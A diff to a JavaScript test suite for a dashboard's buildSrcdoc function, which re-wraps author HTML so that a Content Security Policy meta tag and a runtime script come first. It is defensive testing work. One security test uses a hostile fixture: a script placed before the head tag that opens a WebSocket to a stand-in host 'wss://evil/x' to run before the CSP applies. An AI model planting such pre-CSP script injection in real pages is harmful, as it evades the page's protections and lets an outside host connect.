@@ -5,23 +5,28 @@ import { buildSrcdoc, parseSourcesBlock, CSP_META, RUNTIME_JS } from "./dashboar
 // A stable marker that only appears where the runtime was inlined.
 const RUNTIME_MARK = "window.jarvis = {"
 
-test("full document with <head>: injection lands right after the head tag", () => {
+// Every case is re-wrapped in OUR shell; author head/body inner is extracted,
+// the CSP meta is always the literal first head child, and author content only
+// ever lands inside <head>/<body> AFTER our runtime.
+test("full document with <head>: re-wrapped, CSP first, head/body inner preserved", () => {
   const out = buildSrcdoc("<!DOCTYPE html><html><head><title>t</title></head><body>USER</body></html>", {})
   const head = out.indexOf("<head>")
-  assert.ok(head >= 0)
+  assert.ok(out.startsWith("<!DOCTYPE html><html"))
   // CSP is the FIRST head child (immediately after the opening head tag)
   assert.equal(out.indexOf(CSP_META), head + "<head>".length)
-  // runtime precedes the user's own head content and all user markup
+  // author head + body content are preserved, but AFTER the runtime
+  assert.ok(out.includes("<title>t</title>"))
+  assert.ok(out.includes("<body>USER</body>"))
   assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("<title>t</title>"))
   assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
 })
 
-test("<html> but no <head>: a head is inserted after the html tag, CSP first", () => {
+test("<html> but no <head>: re-wrapped, CSP first, body preserved", () => {
   const out = buildSrcdoc('<html lang="en"><body>USER</body></html>', {})
-  const htmlTag = /<html[^>]*>/.exec(out)[0]
-  const afterHtml = out.indexOf(htmlTag) + htmlTag.length
-  assert.equal(out.indexOf("<head>"), afterHtml)
-  assert.equal(out.indexOf(CSP_META), afterHtml + "<head>".length)
+  const head = out.indexOf("<head>")
+  assert.ok(out.startsWith("<!DOCTYPE html><html"))
+  assert.equal(out.indexOf(CSP_META), head + "<head>".length)
+  assert.ok(out.includes("<body>USER</body>"))
   assert.ok(out.indexOf("</head>") < out.indexOf("USER"))
   assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
 })
@@ -33,15 +38,33 @@ test("fragment: doctype stripped, skeleton wrap, charset present, CSP first", ()
   assert.equal(out.match(/<!doctype/gi).length, 1)
   const head = out.indexOf("<head>")
   assert.equal(out.indexOf(CSP_META), head + "<head>".length)
-  // charset comes right after the CSP (fragment wrap only)
+  // charset comes right after the CSP
   assert.equal(out.indexOf('<meta charset="utf-8">'), head + "<head>".length + CSP_META.length)
   assert.ok(out.includes("<body><div>USER</div></body>"))
   assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
 })
 
-test("charset is only added on the fragment wrap", () => {
-  const full = buildSrcdoc("<html><head></head><body></body></html>", {})
-  assert.ok(!full.includes('<meta charset="utf-8">'))
+test("charset is always present (fragment or full doc, since we always wrap)", () => {
+  assert.ok(buildSrcdoc("<html><head></head><body></body></html>", {}).includes('<meta charset="utf-8">'))
+  assert.ok(buildSrcdoc("<div>x</div>", {}).includes('<meta charset="utf-8">'))
+})
+
+test("SECURITY: a <script> before <head> is dropped, never runs pre-CSP", () => {
+  // The exploit: author markup before <head> executes during 'before head'
+  // parsing, BEFORE our injected CSP meta. We must drop it entirely.
+  const evil =
+    '<html><script>window.__PWNED=new WebSocket("wss://evil/x")</script>' +
+    "<head><title>ok</title></head><body>USER</body></html>"
+  const out = buildSrcdoc(evil, {})
+  const csp = out.indexOf(CSP_META)
+  // the malicious pre-head script must not survive at all
+  assert.ok(!out.includes("__PWNED"), "pre-head script must be dropped")
+  assert.ok(!out.includes('new WebSocket("wss://evil/x")'))
+  // and nothing whatsoever precedes the CSP except our own shell head
+  assert.ok(out.slice(0, csp).indexOf("<script") < 0, "no script before the CSP meta")
+  // legitimate head/body content survives (after the runtime)
+  assert.ok(out.includes("<title>ok</title>"))
+  assert.ok(out.includes("<body>USER</body>"))
 })
 
 test("runtime script precedes user markup in all three cases", () => {
@@ -161,4 +184,15 @@ test("parseSourcesBlock: unwraps double-nested spec ({spec:{spec:{...}}})", () =
     "</script>"
   const sources = parseSourcesBlock(html)
   assert.deepEqual(sources[0].spec, { from: "Sales Invoice" })
+})
+
+test("SECURITY: stale openclaw ws-client script is stripped, other scripts kept", () => {
+  const html =
+    "<html><head></head><body><div id=chart></div>" +
+    "<script>renderChart()</script>" +
+    '<script>const ws=new WebSocket("ws://"+location.host+"/__openclaw__/ws");</script>' +
+    "</body></html>"
+  const out = buildSrcdoc(html, {})
+  assert.ok(out.includes("renderChart()"), "legit script kept")
+  assert.ok(!out.includes("__openclaw__/ws"), "host ws-client stripped")
 })
